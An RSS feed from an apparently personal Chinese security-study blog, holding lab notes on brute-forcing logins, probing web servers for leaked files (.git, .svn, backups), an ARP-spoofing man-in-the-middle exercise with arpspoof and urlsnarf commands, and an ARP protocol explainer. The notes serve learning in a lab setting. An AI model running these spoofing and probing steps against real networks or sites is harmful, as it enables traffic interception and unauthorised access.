<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title></title>
        <subtitle>翩若浮云着霓裳，落幕鬓边皆染霜</subtitle>
        <icon>https://mangpumo.github.io/images/favicon.ico</icon>
        <link>https://MangPumo.github.io</link>
        <author>
          <name>Mang Pumo</name>
        </author>
        <description>欢迎来到 Mang Pumo 的个人博客!</description>
        <language>zh-CN</language>
        <pubDate>Sat, 21 Jan 2023 18:58:58 +0800</pubDate>
        <lastBuildDate>Sat, 21 Jan 2023 18:58:58 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/21/Web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/</guid>
            <title>Web入门_爆破</title>
            <link>https://mangpumo.github.io/2023/01/21/Web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/</link>
            <pubDate>Sat, 21 Jan 2023 18:58:58 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆破&#34;&gt;#&lt;/a&gt; 爆破&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;tomcat 认证爆破之 custom iterator 使用，下载密码字典抓包，通过 burpsuite 暴力破解，&lt;br /&gt;
Payload set ----&amp;gt;custom iterator (自定义迭代器)，&lt;br /&gt;
需要进行 base64 编码；payload processing 进行编码设置，&lt;br /&gt;
取消 Palyload Encoding 编码 因为在进行 base64 加密的时候在最后可能存在 == 这样就会影响 base64 加密的结果，&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆破域名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆破 TOKEN 值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;参考 PHP 随机数的伪随机数 mt_srand (seed); 函数播种 Mersenne Twister 随机数生成器。seed, 可选。规定播种值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Chrome 浏览器抓包，进行暴力破解密码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过暴力破解目录看返回数据包&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/21/Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</guid>
            <title>Web入门_信息搜集</title>
            <link>https://mangpumo.github.io/2023/01/21/Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</link>
            <pubDate>Sat, 21 Jan 2023 17:49:14 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;信息搜集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息搜集&#34;&gt;#&lt;/a&gt; 信息搜集&lt;/h1&gt;
&lt;h2 id=&#34;查看源代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看源代码&#34;&gt;#&lt;/a&gt; 查看源代码&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;右键 - 查看源代码&lt;/li&gt;
&lt;li&gt;通过在 url 头部添加 view-source:&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;抓包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#抓包&#34;&gt;#&lt;/a&gt; 抓包&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;通过 burpsuite 抓包 flag 在返回的响应数据包里面&lt;/li&gt;
&lt;li&gt;cookie，直接抓包，在请求数据包看到 flag, 注 { } 通过了 url 编码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;敏感文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#敏感文件&#34;&gt;#&lt;/a&gt; 敏感文件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;robots.txt 文件，直接访问 url/robots.txt 获得 flag&lt;/li&gt;
&lt;li&gt;phps 文件泄露，直接访问 index.phps。获得 flag&lt;/li&gt;
&lt;li&gt;代码泄露。直接访问 url/www.zip, 获得 flag&lt;/li&gt;
&lt;li&gt;git 代码泄露，直接访问 url/.git/index.php&lt;/li&gt;
&lt;li&gt;信息 svn 泄露，直接访问 url/.svn/&lt;/li&gt;
&lt;li&gt;vim 缓存信息泄露，直接访问 url/index.php.swp 注：上面的信息泄露可以参考 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2E1OTc5MzQ0NDgvYXJ0aWNsZS9kZXRhaWxzLzEwNTQzMTM2Nw==&#34;&gt;https://blog.csdn.net/a597934448/article/details/105431367&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;通过 dns 检查查询 flag &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aWppYW4uYWxpeXVuLmNvbS8=&#34;&gt;https://zijian.aliyun.com/&lt;/span&gt; TXT 记录，一般指为某个主机名或域名设置的说明。查找 xx.xx.com 域名下的 txt 记录&lt;/li&gt;
&lt;li&gt;网站上的公开信息，就是管理员常用密码&lt;/li&gt;
&lt;li&gt;技术文档 在页面下面发现 document 下载发现里面存在后台地址和用户名密码登录成功获 得 flag&lt;/li&gt;
&lt;li&gt;有时候源码里面就能不经意间泄露重要 (editor) 的信息，直接在 url 后面添加 /editor 然后查看 flag 路径并且访问&lt;/li&gt;
&lt;li&gt;公开的信息比如邮箱，可能造成信息泄露，产生严重后果&lt;/li&gt;
&lt;li&gt;对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露。php 探针是用来探测空间、服务器运行状况和 PHP 信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url 后缀名添加 /tz.php 版本是雅黑 PHP 探针，然后查看 phpinfo 搜索 flag&lt;/li&gt;
&lt;li&gt;备份的 sql 文件会泄露敏感信息，backuo.sql&lt;/li&gt;
&lt;li&gt;查看 JS 文件&lt;/li&gt;
&lt;li&gt;前端元素泄漏密钥&lt;/li&gt;
&lt;li&gt;mdb 文件是早期 asp+access 构架的数据库文件 直接查看 url 路径添加 /db/db.mdb 下载文件通过 txt 打开或者通过 EasyAccess.exe 打开搜索 flag&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/14/ARP%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</guid>
            <title>ARP攻击流量分析</title>
            <link>https://mangpumo.github.io/2023/01/14/ARP%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</link>
            <pubDate>Sat, 14 Jan 2023 14:44:01 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;arp攻击-流量分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arp攻击-流量分析&#34;&gt;#&lt;/a&gt; ARP 攻击 - 流量分析&lt;/h1&gt;
&lt;h2 id=&#34;1课前准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1课前准备&#34;&gt;#&lt;/a&gt; 1. 课前准备&lt;/h2&gt;
&lt;p&gt;1.kali 作为攻击机&lt;/p&gt;
&lt;p&gt;2.win10 作为靶机&lt;/p&gt;
&lt;h2 id=&#34;2kali数据包转发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2kali数据包转发&#34;&gt;#&lt;/a&gt; 2.kali 数据包转发&lt;/h2&gt;
&lt;p&gt;出于安全考虑，Linux 系统默认是禁止数据包转发的。所谓转发即当主机拥有多于一块的网卡时，其中一块收到数据包，根据数据包的目的 ip 地址将数据包发往本机另一块网卡，该网卡根据路由表继续发送数据包。这通常是路由器所要实现的功能。我们需要手动开启转发功能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 如何开启通信转发？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;kali 里有个 ip_forward 配置文件&lt;/p&gt;
&lt;p&gt;1. 默认是 0 禁止端口转发&lt;/p&gt;
&lt;p&gt;2. 将其设置成 1 开启端口转发&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 开启步骤&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. 查看当前是否开启了端口转发&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /proc/sys/net/ipv4/ip_forward &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2. 开启通信转发的命令&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo 1 &amp;gt;&amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3. 使用 arpspoof 发起 ARP 攻击&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;4.win10 验证是否转发成功&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;访问：https://www.mashibing.com/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;3dsniff工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3dsniff工具&#34;&gt;#&lt;/a&gt; 3.dsniff 工具&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 工具介绍&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Dsniff 是一个基于 unix 系统网络嗅探工具，工具集包含两个我们需要的两个工具包，arpspoof 和 urlsnarf。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 安装方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;apt-get install dsniff&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3.urlsnarf 工具介绍&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;urlsnarf -h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;urlsnarf [-n] [-i interface | -p pcapfile] [[-v] pattern [expression]]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-n 表示不反查主机名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-i interface 网卡接口名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-p pattern 表示对过滤的内容使用的正则表达式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-v表示取相反，即是不匹配；expression 是过滤语法，和tcpdump的相同，请参考tcpdump。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;4url流量分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4url流量分析&#34;&gt;#&lt;/a&gt; 4.url 流量分析&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 概念&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;URL 流量嗅探操作非常类似于中间人攻击，通过目标主机将路由流量注入到因特网。该过程将通过 ARP 注入实现攻击。url 嗅探能够实时跟踪电脑中的数据流量信息，并且分析出它的类型和去向。从而获得你上网信息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 攻击流程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. 开启流量转发&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo 1 &amp;gt;&amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2. 开启 ARP 攻击&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3. 捕获目标计算机的 url&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;urlsnarf -i eth0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;4. 靶机上网，访问网站&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.http://www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn%2F%23%2F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.http://blog.tianya.cn/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;5.kali 分析用户请求&lt;/p&gt;
&lt;h2 id=&#34;5课堂小结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5课堂小结&#34;&gt;#&lt;/a&gt; 5. 课堂小结&lt;/h2&gt;
&lt;p&gt;请看 ARP 流量分析课后笔记.xmind&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/14/ARP%E5%8D%8F%E8%AE%AE/</guid>
            <title>ARP协议</title>
            <link>https://mangpumo.github.io/2023/01/14/ARP%E5%8D%8F%E8%AE%AE/</link>
            <pubDate>Sat, 14 Jan 2023 14:11:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;arp协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arp协议&#34;&gt;#&lt;/a&gt; ARP 协议&lt;/h1&gt;
&lt;h2 id=&#34;一课前准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一课前准备&#34;&gt;#&lt;/a&gt; 一。课前准备&lt;/h2&gt;
&lt;p&gt;1. 准备 kali 虚拟机 （原理演示机）&lt;/p&gt;
&lt;p&gt;2. 准备 centos7 虚拟机 （靶机）&lt;/p&gt;
&lt;h2 id=&#34;二arp协议工作原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二arp协议工作原理&#34;&gt;#&lt;/a&gt; 二.ARP 协议工作原理&lt;/h2&gt;
&lt;h4 id=&#34;什么是arp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是arp&#34;&gt;#&lt;/a&gt; 什么是 ARP&lt;/h4&gt;
&lt;p&gt;地址解析协议，即 ARP（Address Resolution Protocol），是根据&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9JUCVFNSU5QyVCMCVFNSU5RCU4MA==&#34;&gt; IP 地址&lt;/span&gt;获取&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclODklQTklRTclOTAlODYlRTUlOUMlQjAlRTUlOUQlODAvMjEyOQ==&#34;&gt;物理地址&lt;/span&gt;的一个&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9UQ1AlMkZJUCVFNSU4RCU4RiVFOCVBRSVBRQ==&#34;&gt; TCP/IP 协议&lt;/span&gt;。&lt;/p&gt;
&lt;h4 id=&#34;工作原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工作原理&#34;&gt;#&lt;/a&gt; 工作原理&lt;/h4&gt;
&lt;p&gt;ARP 协议规定，每台计算机都需要一个 ARP 表，用来保存 IP 地址和 MAC 地址的映射关系 。访问 IP 地址的时候就去查 ARP 表，从而找到对应的 MAC 地址。&lt;/p&gt;
&lt;p&gt;如果 ARP 表中匹配不到，就会使用广播的方式发送一个 ARP 请求 ，目标主机收到请求后会使用单播的方式返回一个 ARP 响应，告知自己的 MAC 地址 。&lt;/p&gt;
&lt;p&gt;拿到 MAC 地址后，会将映射关系缓存到 ARP 表，而后传递到数据链路层进行解析转换。&lt;/p&gt;
&lt;h2 id=&#34;三arp-协议的作用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三arp-协议的作用&#34;&gt;#&lt;/a&gt; 三.ARP 协议的作用&lt;/h2&gt;
&lt;p&gt;网络中的数据传输所依赖的是 MAC 地址而不是 IP 地址，ARP 协议负责将 IP 地址转换为 MAC 地址。&lt;/p&gt;
&lt;p&gt;ARP 协议的主要工作就是建立、查询、更新、删除 ARP 表项。&lt;/p&gt;
&lt;h2 id=&#34;四arp常用命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四arp常用命令&#34;&gt;#&lt;/a&gt; 四.ARP 常用命令&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;查询 arp 表：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arp -a   &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;.%5Cimage-20211018181543457.png&#34; alt=&#34;image-20211018181543457&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2. 删除表内某个 IP&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arp -d IP      &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3.tcp 抓某块网卡的所有 arp 请求&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tcpdump -i eth0 -nn arp     &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;4.tcp 抓取指定 ip 的请求&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tcpdump -i eth0 -nn arp  and host IP     &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;h2 id=&#34;五arp工作过程演示&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#五arp工作过程演示&#34;&gt;#&lt;/a&gt; 五.ARP 工作过程演示&lt;/h2&gt;
&lt;p&gt;在 centos7 上通过抓包来了解 arp 的工作过程：&lt;/p&gt;
&lt;p&gt;1. 首先查看一下该机器有没有 ip:192.168.110.13 的 mac 地址&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arp -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果存在则先删除掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;arp -d IP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2. 在 centos7 上抓包&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tcpdump -i eth0 -nn arp  或者 tcpdump -i eth0 -nn arp and host 192.168.110.13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3.ping 一下该 ip&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ping 192.168.110.13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;4. 查看抓包结果&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;06:07:58.827256 ARP, Request who-has 192.168.110.13 tell 192.168.110.26, length 28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这句话的意思是，请问谁是192.168.110.13 ，请将你的mac地址告诉给 192.168.110.26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;06:07:58.827858 ARP, Reply 192.168.110.13 is-at 00:0c:29:90:e6:8d, length 46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这句话的意思是，我是92.168.110.13，我的mac地址是：00:0c:29:90:e6:8d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;5. 查看最新的 ARP 表，看看是否绑定了 mac 地址&lt;/p&gt;
